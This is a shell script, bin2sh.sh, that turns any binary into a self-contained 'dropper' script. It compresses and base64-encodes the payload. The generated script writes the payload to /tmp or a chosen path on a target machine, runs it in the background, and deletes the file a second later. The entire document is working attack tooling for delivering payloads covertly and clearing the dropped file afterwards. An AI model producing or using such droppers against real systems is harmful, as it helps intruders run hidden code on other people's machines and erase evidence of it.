#!/bin/sh
#
# bin2sh.sh
# Turn a binary into a shell script which extracts the binary
# By J. Stuart McMurray
# Created 20201010
# Last Modified 20201010

# Default dropped file name
DFNAME=/tmp/dropped

usage() {
        echo "Usage: $0 [-d name] [payload]" >&2
        echo >&2
        cat <<_eof >&2
Generates a shell script (i.e. a dropper) which will write a payload to disk and
execute it, backgrounded, then delete it.

The name of the file to which the payload will be written can be set with -d.
The script's current working directory will be added to the \$PATH when the
payload is started, so it's not necessary to pass a full path to -d. The
default is $DFNAME.

The payload may either be specified as an argument to this script or passed via
stdin.

Requires gunzip and openssl be on target.
_eof
        exit 1
}

# Get the dropped file's name on target
args=$(getopt hd: $*)
if [ $? -ne 0 ]; then
        usage
fi
set -- $args
while [ $# -ne 0 ]; do
        case "$1" in
                -h) usage; shift;;
                -d) DFNAME="$2"; shift; shift;;
                --) shift; break;;
        esac
done

# Work out the source
if [ -n "$1" ]; then
        if ! [ -r "$1" ]; then
                echo "Source file $1 isn't readable" >&2
                exit 2
        fi
        exec 0<"$1"
else
        if [ -t 0 ]; then
                usage
                exit 3
        fi
fi

# Start the dropper
echo '#!/bin/sh'
echo "openssl base64 -d <<_eof | gunzip -c >$DFNAME"

# Encode it
gzip -c - | openssl base64 -e
echo "_eof"

# Fire off the payload.  The sleep is there to give the program time to start
# before we remove the file.  There's more elegant (and correct) ways to do
# it, but this is probably the most portable.
echo "chmod 0700 $DFNAME; PATH=.:\$PATH $DFNAME & sleep 1; rm $DFNAME"
